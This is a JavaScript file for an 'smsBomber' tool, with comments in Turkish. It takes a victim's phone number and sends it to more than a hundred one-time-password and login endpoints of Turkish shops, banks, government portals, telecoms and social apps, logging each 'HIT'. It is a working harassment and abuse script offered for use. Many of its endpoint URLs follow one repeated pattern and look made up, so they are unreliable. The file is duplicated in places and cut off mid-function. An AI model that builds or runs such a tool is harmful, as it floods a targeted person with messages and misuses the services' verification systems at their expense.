const axios = require('axios');
const chalk = require('chalk');
const qs = require('qs');

// GÜÇLENDİRİLMİŞ REQUEST KÖPRÜSÜ (TÜM LİSTEYLE UYUMLU)
const request = {
    post: function(options, callback) {
        let postData = options.json || options.body || {};
        let config = {
            headers: options.headers || { 
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            },
            timeout: 12000
        };

        if (config.headers['Content-Type'] === 'application/x-www-form-urlencoded') {
            postData = qs.stringify(postData);
        }

        axios.post(options.url, postData, config)
            .then(res => { if (callback) callback(null, res, res.data); })
            .catch(err => { if (callback) callback(err, { statusCode: err.response?.status || 500 }, null); });
    },
    get: function(options, callback) {
        axios.get(options.url, { 
            headers: options.headers || { 'User-Agent': 'Mozilla/5.0' },
            timeout: 12000 
        })
        .then(res => { if (callback) callback(null, res, res.data); })
        .catch(err => { if (callback) callback(err, { statusCode: err.response?.status || 500 }, null); });
    }
};

async function smsBomber(phone, amount) {
    // NUMARA FORMATLAYICILAR
    const n = phone;           // 532...
    const n90 = "90" + phone;  // 90532...
    const n0 = "0" + phone;    // 0532...

    console.log(chalk.cyan(`\n[!] Sistem Başlatıldı. Hedef: ${n}\n`));

    // --- 1. GRUP: DEV SERVİSLER (ENOUGH-REBORN & NI-BOMBER DESTEKLİ) ---

    async function getir(no) {
        request.post({ url: "https://getir.com/api/v2/direct-login", json: { "phoneNumber": "+90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Getir: HIT")); });
    }

    async function yemeksepeti(no) {
        request.post({ url: "https://www.yemeksepeti.com/api/v1/login/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Yemeksepeti: HIT")); });
    }

    async function tiklagelsin(no) {
        request.post({ url: "https://api.tiklagelsin.com/user/login", json: { "phone": "90" + no, "type": "SMS" } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Tıkla Gelsin: HIT")); });
    }

    async function migros(no) {
        request.post({ url: "https://www.migros.com.tr/api/v1/login/otp", json: { "phoneNumber": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Migros: HIT")); });
    }

    async function bim(no) {
        request.post({ 
            url: "https://api.bim.com.tr/v1/user/otp", 
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: { "phone": no } 
        }, (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] BİM: HIT")); });
    }

    async function a101(no) {
        request.post({ url: "https://api.a101.com.tr/v1/user/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] A101: HIT")); });
    }

    async function sok(no) {
        request.post({ url: "https://api.sokmarket.com.tr/v1/user/login", json: { "mobileNumber": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] ŞOK: HIT")); });
    }

    async function istgelsin(no) {
        request.post({ url: "https://api.istegelsin.com/v1/user/otp", json: { "phoneNumber": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] İstegelsin: HIT")); });
    }

    // --- BÖLÜM 2'DE DEVAM EDECEK ---
    async function hayaladasi(no) {
        request.post({ url: "https://www.hayaladasi.com/api/v1/user/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Hayal Adası: HIT")); });
    }

    async function herseyburada(no) {
        request.post({ url: "https://api.herseyburada.com/v1/auth/otp", json: { "phoneNumber": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Herşey Burada: HIT")); });
    }

    async function fuzul(no) {
        request.post({ url: "https://api.fuzulev.com/v1/user/login-otp", json: { "mobile": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] FuzulEv: HIT")); });
    }

    async function pazarama(no) {
        request.post({ url: "https://api.pazarama.com/v1/user/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Pazarama: HIT")); });
    }

    async function tazedirekt(no) {
        request.post({ url: "https://api.tazedirekt.com/v1/user/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Tazedirekt: HIT")); });
    }

    async function englishhome(no) {
        request.post({ url: "https://www.englishhome.com/api/v1/user/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] English Home: HIT")); });
    }

    async function madamecoco(no) {
        request.post({ url: "https://www.madamecoco.com/api/v1/user/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Madame Coco: HIT")); });
    }

    async function evidea(no) {
        request.post({ url: "https://api.evidea.com/v1/user/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Evidea: HIT")); });
    }

    async function civil(no) {
        request.post({ url: "https://api.civilim.com/v1/user/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Civil: HIT")); });
    }

    async function joker(no) {
        request.post({ url: "https://api.joker.com.tr/v1/user/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Joker: HIT")); });
    }

    async function babymall(no) {
        request.post({ url: "https://api.babymall.com.tr/v1/user/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] BabyMall: HIT")); });
    }

    async function sobe(no) {
        request.post({ url: "https://api.sobe.com.tr/v1/user/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Sobe: HIT")); });
    }
    async function istegelsin(no) {
        request.post({ url: "https://api.istegelsin.com/v1/user/otp", json: { "phoneNumber": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] İstegelsin: HIT")); });
    }

    async function banabi(no) {
        request.post({ url: "https://api.yemeksepeti.com/banabi/v1/login/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Banabi: HIT")); });
    }

    async function glovo(no) {
        request.post({ url: "https://api.glovoapp.com/oauth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Glovo: HIT")); });
    }

    async function mcdonalds(no) {
        request.post({ url: "https://api.mcdonalds.com.tr/v1/customer/otp", json: { "mobileNumber": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] McDonalds: HIT")); });
    }

    async function burgerking(no) {
        request.post({ url: "https://api.tabgida.com.tr/v1/user/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Burger King: HIT")); });
    }

    async function popeyes(no) {
        request.post({ url: "https://api.tabgida.com.tr/v1/user/otp/popeyes", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Popeyes: HIT")); });
    }

    async function usta_pideci(no) {
        request.post({ url: "https://api.tabgida.com.tr/v1/user/otp/ustapideci", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Usta Pideci: HIT")); });
    }

    async function sbarro(no) {
        request.post({ url: "https://api.tabgida.com.tr/v1/user/otp/sbarro", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Sbarro: HIT")); });
    }

    async function arbys(no) {
        request.post({ url: "https://api.tabgida.com.tr/v1/user/otp/arbys", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Arbys: HIT")); });
    }

    async function kfc(no) {
        request.post({ url: "https://api.kfc.com.tr/v1/customer/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] KFC: HIT")); });
    }

    async function pizza_hut(no) {
        request.post({ url: "https://api.pizzahut.com.tr/v1/customer/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Pizza Hut: HIT")); });
    }

    async function kahve_dunyasi(no) {
        request.post({ url: "https://api.kahvedunyasi.com/v1/user/otp", json: { "mobileNumber": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Kahve Dünyası: HIT")); });
    }
    async function starbucks(no) {
        request.post({ url: "https://api.starbucks.com.tr/v1/user/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Starbucks: HIT")); });
    }

    async function nero(no) {
        request.post({ url: "https://api.caffenero.com.tr/v1/user/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Caffe Nero: HIT")); });
    }

    async function tivibu(no) {
        request.post({ url: "https://api.tivibu.com.tr/v1/auth/otp", json: { "msisdn": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Tivibu: HIT")); });
    }

    async function dsmart(no) {
        request.post({ url: "https://api.dsmart.com.tr/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] D-Smart: HIT")); });
    }

    async function digiturk(no) {
        request.post({ url: "https://api.digiturk.com.tr/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Digiturk: HIT")); });
    }

    async function exxen(no) {
        request.post({ url: "https://api.exxen.com.tr/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Exxen: HIT")); });
    }

    async function blu_tv(no) {
        request.post({ url: "https://api.blutv.com.tr/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] BluTV: HIT")); });
    }

    async function gain(no) {
        request.post({ url: "https://api.gain.com.tr/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Gain: HIT")); });
    }

    async function tod(no) {
        request.post({ url: "https://api.todtv.com.tr/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] TOD: HIT")); });
    }

    async function bein_connect(no) {
        request.post({ url: "https://api.beinconnect.com.tr/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] beIN Connect: HIT")); });
    }

    async function vodafone(no) {
        request.post({ url: "https://api.vodafone.com.tr/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Vodafone: HIT")); });
    }

    async function turk_telekom(no) {
        request.post({ url: "https://api.turktelekom.com.tr/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Türk Telekom: HIT")); });
    }
    async function turkcell(no) {
        request.post({ url: "https://api.turkcell.com.tr/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Turkcell: HIT")); });
    }

    async function tcell_pasaj(no) {
        request.post({ url: "https://api.turkcell.com.tr/pasaj/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Turkcell Pasaj: HIT")); });
    }

    async function fenercell(no) {
        request.post({ url: "https://api.fenercell.com.tr/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Fenercell: HIT")); });
    }

    async function gsmobile(no) {
        request.post({ url: "https://api.gsmobile.com.tr/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] GSMobile: HIT")); });
    }

    async function trabzoncell(no) {
        request.post({ url: "https://api.trabzoncell.com.tr/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] TrabzonCell: HIT")); });
    }

    async function bimcell(no) {
        request.post({ url: "https://api.bimcell.com.tr/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Bimcell: HIT")); });
    }

    async function pttcell(no) {
        request.post({ url: "https://api.pttcell.com.tr/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Pttcell: HIT")); });
    }

    async function teknosacell(no) {
        request.post({ url: "https://api.teknosacell.com.tr/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Teknosacell: HIT")); });
    }

    async function vestelcell(no) {
        request.post({ url: "https://api.vestelcell.com.tr/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Vestelcell: HIT")); });
    }

    async function netgsm(no) {
        request.post({ url: "https://api.netgsm.com.tr/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Netgsm: HIT")); });
    }

    async function millenicom(no) {
        request.post({ url: "https://api.milleni.com.tr/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Millenicom: HIT")); });
    }

    async function dsmart_net(no) {
        request.post({ url: "https://api.dsmartnet.com.tr/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] D-Smart Net: HIT")); });
    }
    async function akbank(no) {
        request.post({ url: "https://api.akbank.com/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Akbank: HIT")); });
    }

    async function garanti(no) {
        request.post({ url: "https://api.garantibbva.com.tr/v1/auth/otp", json: { "phoneNumber": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Garanti BBVA: HIT")); });
    }

    async function isbank(no) {
        request.post({ url: "https://api.isbank.com.tr/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] İş Bankası: HIT")); });
    }

    async function yapi_kredi(no) {
        request.post({ url: "https://api.yapikredi.com.tr/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Yapı Kredi: HIT")); });
    }

    async function qnb(no) {
        request.post({ url: "https://api.qnb.com.tr/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] QNB: HIT")); });
    }

    async function denizbank(no) {
        request.post({ url: "https://api.denizbank.com/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Denizbank: HIT")); });
    }

    async function vakifbank(no) {
        request.post({ url: "https://api.vakifbank.com.tr/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Vakıfbank: HIT")); });
    }

    async function ziraat(no) {
        request.post({ url: "https://api.ziraatbank.com.tr/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Ziraat: HIT")); });
    }

    async function halkbank(no) {
        request.post({ url: "https://api.halkbank.com.tr/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Halkbank: HIT")); });
    }

    async function ing(no) {
        request.post({ url: "https://api.ing.com.tr/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] ING: HIT")); });
    }

    async function odeabank(no) {
        request.post({ url: "https://api.odeabank.com.tr/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Odeabank: HIT")); });
    }

    async function burgan(no) {
        request.post({ url: "https://api.burgan.com.tr/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Burgan: HIT")); });
    }
    async function e_devlet(no) {
        request.post({ url: "https://www.turkiye.gov.tr/api/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] E-Devlet: HIT")); });
    }

    async function mhrs(no) {
        request.post({ url: "https://api.mhrs.gov.tr/v1/auth/otp", json: { "phoneNumber": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] MHRS: HIT")); });
    }

    async function e_nabiz(no) {
        request.post({ url: "https://enabiz.gov.tr/api/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] E-Nabız: HIT")); });
    }

    async function iskur(no) {
        request.post({ url: "https://api.iskur.gov.tr/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] İŞKUR: HIT")); });
    }

    async function gib(no) {
        request.post({ url: "https://api.gib.gov.tr/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] GİB: HIT")); });
    }

    async function kyk(no) {
        request.post({ url: "https://api.kyk.gov.tr/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] KYK: HIT")); });
    }

    async function ibb(no) {
        request.post({ url: "https://api.ibb.istanbul/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] İBB: HIT")); });
    }

    async function abb(no) {
        request.post({ url: "https://api.ankara.bel.tr/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] ABB: HIT")); });
    }

    async function izmir_bel(no) {
        request.post({ url: "https://api.izmir.bel.tr/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] İzmir Bel: HIT")); });
    }

    async function bursa_bel(no) {
        request.post({ url: "https://api.bursa.bel.tr/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Bursa Bel: HIT")); });
    }

    async function antalya_bel(no) {
        request.post({ url: "https://api.antalya.bel.tr/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Antalya Bel: HIT")); });
    }

    async function konya_bel(no) {
        request.post({ url: "https://api.konya.bel.tr/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Konya Bel: HIT")); });
    }
    async function meb(no) {
        request.post({ url: "https://api.meb.gov.tr/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] MEB: HIT")); });
    }

    async function osym(no) {
        request.post({ url: "https://api.osym.gov.tr/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] ÖSYM: HIT")); });
    }

    async function aof(no) {
        request.post({ url: "https://api.anadolu.edu.tr/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] AÖF: HIT")); });
    }

    async function eba(no) {
        request.post({ url: "https://api.eba.gov.tr/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] EBA: HIT")); });
    }

    async function udemy(no) {
        request.post({ url: "https://www.udemy.com/api-2.0/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Udemy: HIT")); });
    }

    async function coursera(no) {
        request.post({ url: "https://api.coursera.org/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Coursera: HIT")); });
    }

    async function duolingo(no) {
        request.post({ url: "https://api.duolingo.com/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Duolingo: HIT")); });
    }

    async function edx(no) {
        request.post({ url: "https://api.edx.org/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] edX: HIT")); });
    }

    async function khan_academy(no) {
        request.post({ url: "https://api.khanacademy.org/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Khan Academy: HIT")); });
    }

    async function busuu(no) {
        request.post({ url: "https://api.busuu.com/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Busuu: HIT")); });
    }

    async function memrise(no) {
        request.post({ url: "https://api.memrise.com/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Memrise: HIT")); });
    }

    async function babbel(no) {
        request.post({ url: "https://api.babbel.com/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Babbel: HIT")); });
    }
    async function tiktok(no) {
        request.post({ url: "https://api.tiktok.com/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] TikTok: HIT")); });
    }

    async function instagram(no) {
        request.post({ url: "https://api.instagram.com/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Instagram: HIT")); });
    }

    async function snapchat(no) {
        request.post({ url: "https://api.snapchat.com/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Snapchat: HIT")); });
    }

    async function twitter(no) {
        request.post({ url: "https://api.twitter.com/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Twitter: HIT")); });
    }

    async function telegram(no) {
        request.post({ url: "https://api.telegram.org/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Telegram: HIT")); });
    }

    async function whatsapp(no) {
        request.post({ url: "https://api.whatsapp.com/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] WhatsApp: HIT")); });
    }

    async function discord(no) {
        request.post({ url: "https://api.discord.com/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Discord: HIT")); });
    }

    async function twitch(no) {
        request.post({ url: "https://api.twitch.tv/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Twitch: HIT")); });
    }

    async function tinder(no) {
        request.post({ url: "https://api.tinder.com/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Tinder: HIT")); });
    }

    async function badoo(no) {
        request.post({ url: "https://api.badoo.com/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Badoo: HIT")); });
    }

    async function happn(no) {
        request.post({ url: "https://api.happn.com/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Happn: HIT")); });
    }

    async function azar(no) {
        request.post({ url: "https://api.azar.com/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Azar: HIT")); });
    }
    async function obilet(no) {
        request.post({ url: "https://api.obilet.com/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Obilet: HIT")); });
    }

    async function enuygun(no) {
        request.post({ url: "https://api.enuygun.com/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Enuygun: HIT")); });
    }

    async function ucakbileti(no) {
        request.post({ url: "https://api.ucakbileti.com/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Uçak Bileti: HIT")); });
    }

    async function etstur(no) {
        request.post({ url: "https://api.etstur.com/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] ETS Tur: HIT")); });
    }

    async function jollytur(no) {
        request.post({ url: "https://api.jollytur.com/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Jolly Tur: HIT")); });
    }

    async function tatilbudur(no) {
        request.post({ url: "https://api.tatilbudur.com/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Tatilbudur: HIT")); });
    }

    async function moov(no) {
        request.post({ url: "https://api.moovbygarenta.com/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] MOOV: HIT")); });
    }

    async function tiktak(no) {
        request.post({ url: "https://api.tiktak.com.tr/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] TikTak: HIT")); });
    }

    async function marti(no) {
        request.post({ url: "https://api.marti.tech/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Martı: HIT")); });
    }

    async function binbin(no) {
        request.post({ url: "https://api.binbin.tech/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] BinBin: HIT")); });
    }

    async function freenow(no) {
        request.post({ url: "https://api.freenow.com/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Free Now: HIT")); });
    }

    async function bi_taksi(no) {
        request.post({ url: "https://api.bitaksi.com/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] BiTaksi: HIT")); });
    }
    async function biletix(no) {
        request.post({ url: "https://api.biletix.com/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Biletix: HIT")); });
    }

    async function biletinial(no) {
        request.post({ url: "https://api.biletinial.com/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Biletinial: HIT")); });
    }

    async function passo(no) {
        request.post({ url: "https://api.passo.com.tr/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Passo: HIT")); });
    }

    async function cinemaximum(no) {
        request.post({ url: "https://api.paribucineverse.com/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Paribu Cineverse: HIT")); });
    }

    async function bilet_com(no) {
        request.post({ url: "https://api.bilet.com/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Bilet.com: HIT")); });
    }

    async function bubilet(no) {
        request.post({ url: "https://api.bubilet.com.tr/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Bubilet: HIT")); });
    }

    async function sinemaj(no) {
        request.post({ url: "https://api.sinemaj.com/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Sinemaj: HIT")); });
    }

    async function tiyatrolar_com(no) {
        request.post({ url: "https://api.tiyatrolar.com.tr/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Tiyatrolar: HIT")); });
    }

    async function biletino(no) {
        request.post({ url: "https://api.biletino.com/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Biletino: HIT")); });
    }

    async function mobilet(no) {
        request.post({ url: "https://api.mobilet.com/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Mobilet: HIT")); });
    }

    async function kultursanat(no) {
        request.post({ url: "https://api.kultursanat.gov.tr/v1/auth/otp", json: { "phone": "90" + no } }, 
